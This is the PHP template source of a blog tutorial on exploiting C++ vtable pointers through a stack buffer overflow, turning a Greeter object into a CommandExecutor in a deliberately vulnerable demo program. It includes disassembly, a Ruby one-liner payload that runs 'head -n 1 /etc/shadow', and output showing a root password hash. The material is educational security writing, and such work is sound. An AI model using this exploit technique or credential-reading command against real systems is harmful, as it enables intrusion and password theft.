<?php
    Upvote::render_arrows(
        "cppvtables",
        "defuse_pages",
        "Exploiting C++ VTABLES: Instance Replacement",
        "Use a memory corruption vulnerability to change an instance of class A into an instance of class B.",
        "https://defuse.ca/exploiting-cpp-vtables.htm"
    );
?>
<div class="pagedate">
May 11, 2013
</div>
<h1>Exploiting C++ VTABLES: Instance Replacement</h1>

<p>
The purpose of this post is to demonstrate an interesting way to exploit memory
corruption vulnerabilities that let you overwrite an instance of a C++ class.
The idea is to alter the instance so that it becomes an instance of a different
class. When the code calls virtual methods on what it thinks is an instance of
class A, it will really be calling virtual methods of a different class B.
</p>

<p>
First we have to learn how an instance of a C++ class is represented in memory,
and what the difference between a virtual method and a non-virtual method is.
</p>

<h2>In-Memory Instance Representation</h2>

<p>
There is no standard that says how C++ classes should be represented in memory.
Different compilers use different representations, but they are mostly the same.
For the sake of simplicty, I'll only cover very simple types of classes: Those
that extend at most one class, which does not extend any other class. So we will
not cover multiple inheritance (Class A extends Classes B and C) or repeated
inheritance (Class A extends Class B which extends Class C). We will cover
classes that don't extend at all, and classes that extend a single base class
(Class A extends Class B, but Class B doesn't extend anything). See <a
href="http://www.openrce.org/articles/files/jangrayhood.pdf">C++ Under the
Hood</a> for a description of more the advanced kinds of inheritance.
</p>

<p>
For this guide I'll be using G++ on x86 (32 bit) Linux. If you're running
a 64-bit system, you can produce 32-bit binaries by passing the -m32 flag to
G++.
</p>

<h3>Bare Classes</h3>

<p>
Let's begin with the simplest case. A class that has no member variables, and
only non-virtual methods.
</p>

<?php
    printSourceFile("source/DemoClass1.cpp", true);
?>

<?php
    $str = <<<EOT
Hello!
sizeof(f) = 1, f = -9
Hello!
sizeof(f) = 1, f = 42

EOT;
    printHlString($str, "text", false);
?>

<p>
This shows that an instance of Foo takes up just one byte of memory. What is
that byte? It's nothing, really. There's no data associated with an instance of
Foo, but it has to exist somewhere, so G++ represents it with a meaningless
byte. We can even change that byte and the instance will continue to function
normally.
</p>

<h3>Member Variables</h3>

<p>
Let's stick to non-virtual methods, but this time we'll add some member
variables.
</p>

<?php
    printSourceFile("source/DemoClass2.cpp", true);
?>

<?php
    $str = <<<EOT
Hello!
sizeof(f) = 12
v1 =      1, v2 =      2, v3 =      3
vars[0] = 1, vars[1] = 2, vars[2] = 3
v1 = 1337
EOT;
    printHlString($str, "text", false);
?>

<p>
We've added three int member variables to Foo, and now an instance takes 12
bytes of memory. That makes sense, since each int variable takes 4 bytes, and
3 * 4 = 12.  To convince ourselves that it really is just the variables laid out
in order, we can treat it as an integer array and print the first 3 elements. We
can even modify them that way.
</p>

<p>
The Foo instance is laid out in memory like this:
</p>

<?php
    $str = <<<EOT
struct {
    int v1;
    int v2;
    int v3;
};
EOT;
    printHlString($str, "c", false);
?>

<h3>Virtual Methods</h3>

<p>
What's the difference between a virtual method and a non-virtual method? Without
any inheritance, both are functionally equivalent. The difference appears when
you add inheritance and override methods.
</p>

<?php
    printSourceFile("source/DemoClass3.cpp", true);
?>

<?php
    $str = <<<EOT
Hello from a NON-VIRTUAL method in FooBar!
Hello from a VIRTUAL method in FooBar!
Hello from a NON-VIRTUAL method in Foo!
Hello from a VIRTUAL method in FooBar!
---------
sizeof(foobar) = 4, sizeof(foo) = 4
FooBar vtable pointer: 0x8048928
Foo vtable pointer: 0x8048938
First entry of FooBar VTABLE: 0x80486ba
First entry of Foo VTABLE: 0x8048692
EOT;
    printHlString($str, "text", false);
?>

<p>
The difference is subtle, but important. Overriding virtual methods behaves how
we would expect it to: When we treat the instance of FooBar as though it was an
instance of Foo, calling a virtual method runs <em>FooBar's</em> implementation.
When we're treating an instance of FooBar as though it was a Foo, and we call
a non-virtual method, what gets executed is <em>Foo's</em> implementation (even
though it is really a FooBar!).
</p>

<p>
When we have just a pointer to a Foo object, it could either be pointing to
a instance of Foo, or to an instance of FooBar. So how does the runtime know to
call FooBar's virtual method when it's really a FooBar, and Foo's virtual method
when it's just a Foo? The answer is <b>vtables</b>.
</p>

<p>
Every class with virtual methods has a hidden member variable: a pointer to
a vtable, which is basically just an array of function pointers, one element for
each of the class's virtual methods. In this example, an instance of FooBar is
just a pointer to FooBar's vtable, which has one element: a pointer to
FooBar::v(). An instance of Foo is just a pointer to Foo's vtable, which has one
element: a pointer to Foo::v().
</p>

<p>
If the classes had member variables, they would appear after the vtable pointer.
</p>

<p>
This means that when we call a virtual method, we have to look up the address of
the method in the Class's vtable. The complete process is as follows:
</p>

<ol>
    <li>Get the address of the Class's vtable from the object itself.</li>
    <li>Get the address of the Class's virtual method from the vtable.</li>
    <li>Call the virtual method at that address.</li>
</ol>

<p>
When you add things like multiple inheritance it gets a lot more complicated
than this, but now we have a good enough understanding of C++ class internals to
do some fun stuff.
</p>

<h2>Instance Replacement: Turn a Greeter into a CommandExecutor</h2>

<p>
Here's some vulnerable code. It's a simple program that just asks you if you're
18 or older, and if you answer yes, asks you for your name and greets you. The
gets() call on line 32 creates a stack overflow vulnerability.
</p>

<?php
    printSourceFile("source/DemoClass4.cpp", true);
?>

<p>
The gets() call on line 32 will keep accepting data from stdin until it sees
a newline. This means we can overflow 'buf', and overwrite anything on the stack
that comes after buf. We could use this vulnerability to overwrite the return
address and jump into some shellcode, but let's suppose there's a stack canary
or something stopping us from doing so.
</p>

<p>
We can exploit this code by using the buffer overflow vulnerability to change
the Greeter object into a CommandExecutor object. Both classes have no member
variables, and one virtual method each, so all they are on the stack is a vtable
pointer. A Greeter object is just a pointer to Greeter's vtable.
A CommandExecutor object is just a pointer to CommandExecutor's vtable.
Greeter's vtable contains one entry: a pointer to Greeter::sayHello().
CommandExecutor's vtable contains one entry: a pointer to
CommandExecutor::execute().
</p>


<p>
To change the Greeter 'g' into a CommandExecutor, all we have to do is overwrite
its vtable pointer with a pointer to CommandExecutor's vtable. Once we've done
that, when greet() calls sayHello() on what it thinks is a Greeter, it will
actually be calling execute() on an instance of CommandExecutor, which lets us
inject shell commands.
</p>

<p>
We have to find out where CommandExecutor's vtable is. This is very easy, we
just have to look at CommandExecutor's constructor:
</p>

<?php
    $str = <<<EOT
08048736 <_ZN15CommandExecutorC1Ev>:
 8048736:       55                      push   ebp
 8048737:       89 e5                   mov    ebp,esp
 8048739:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 804873c:       c7 00 88 88 04 08       mov    DWORD PTR [eax],0x8048888 <--
 8048742:       5d                      pop    ebp
 8048743:       c3                      ret    
EOT;
    printHlString($str, "text", false);
?>

<p>
There it is! 0x08048888 is the address of CommandExecutor's vtable.
</p>

<p>
Now we can construct the exploit. First we look at the disassembly of main()...
</p>

<?php
    $str = <<<EOT
08048624 <main>:
    ...
    0x08048656 <main+50>:	mov    DWORD PTR [esp+0x4],0x8048859
    0x0804865e <main+58>:	lea    eax,[esp+0x1c] <-- buf
    0x08048662 <main+62>:	mov    DWORD PTR [esp],eax
    0x08048665 <main+65>:	call   0x8048554 <strcmp@plt>
    ...
    0x0804866e <main+74>:	lea    eax,[esp+0x5c] <-- g
    0x08048672 <main+78>:	mov    DWORD PTR [esp],eax
    0x08048675 <main+81>:	call   0x8048688 <_Z5greetP7Greeter>
    ...
EOT;
    printHlString($str, "text", false);
?>

<p>
...and notice 'g' starts at esp+0x5c and 'buf' starts at esp+0x1c. The
difference is (esp+0x5c) - (esp+0x1c) = 0x5c - 0x1c = 64. So to exploit this, we
just have to input 64 bytes (to fill 'buf') then input 0x8048888 (to overwrite
g's vtable address). 'buf' has to strcmp with "y" so our input will have to
start with "y\x00". The zero byte is ok, since gets() doesn't stop when it
encounters a zero.
</p>

<p>
Putting it all together:
</p>

<?php
    $str = <<<'EOT'
ruby -e 'print "y\x00" +        // make the age check pass
    "A"*62 +                    // fill the rest of 'buf'
    "\x88\x88\x04\x08" +        // overwrite g's vtable pointer with the
                                // address of CommandExecutor's vtable
    "\n" +                      // end the first input
    "head -n 1 /etc/shadow\n"'  // command to run.
    | ./main
EOT;
    printHlString($str, "text", false);
?>

<p>
Note the vtable address is encoded in little-endian format.
</p>

<p>
Output:
</p>

<?php
    $str = <<<'EOT'
$ ruby -e 'print "y\x00" + "A"*62 + "\x88\x88\x04\x08" + "\n" + "head -n 1 /etc/shadow\n"' | ./main
root:$6$iZxyrn8I$SwtrvlV74y7kzc4aXRZDWLuWNHv/GcXbw09wxqzMI5xg8Swf76xGX6xZVfkKu1.eM4LwJRfmMaGnXzGXmMlCE0:15835:0:99999:7:::
You must be 18 years or older to use this program. Are you? What is your name?
EOT;
    printHlString($str, "text", false);
?>


<?php
// ' <-- fucking vim syntax highlighting fucks up cuz of previous nowdocs
?>

<h2>What else can you do?</h2>

<p>
This is cool, but there's a lot more you can do when you have an opportunity to
overwrite a vtable pointer. Some interesting ideas are:
</p>

<ul>
    <li>
    Overwrite not ony the vtable pointer, but member variables as well.
    </li>
    <li>
    Inject your own vtable and overwrite the vtable pointer with the address of
    your own. As the legitamete code calls virtual methods on the object,
    methods of your choice get called instead.
    </li>
    <li>
    Change a subclass into an instance of its superclass, to bypass extra
    security checks that were added in the subclass.
    </li>
    <li>
    If two classes extend the same base class, transform one into an instance of
    the other. This is interesting because any system that could detect or
    prevent this kind of exploit would have to (1) Protect against data
    corruption (and not just control flow hijacking) or (2) Know which subclass
    a pointer to a superclass is supposed to be (violating polymorphism).
    </li>
</ul>

<h2>Credit</h2>

<p>
Exploiting by overwriting vtable pointers has been known for a long time. So
I don't claim to have invented any of this. I'd like to link to the first or
authoritative paper on vtable overwriting (the vtable equivalent of "Smashing
the Stack for Fun and Profit"), but Google is turning up nothing but blog posts
and tutorials. If you know what came first, please let me know!
</p>

<p>
The best I have found is this slide deck: 
<a href="www.blackhat.com/presentations/bh-asia-00/greg/greg-asia-00-stalking.ppt">
Advanced Buffer Overflow Technique - Greg Hoglund (Black Hat)</a>
</p>
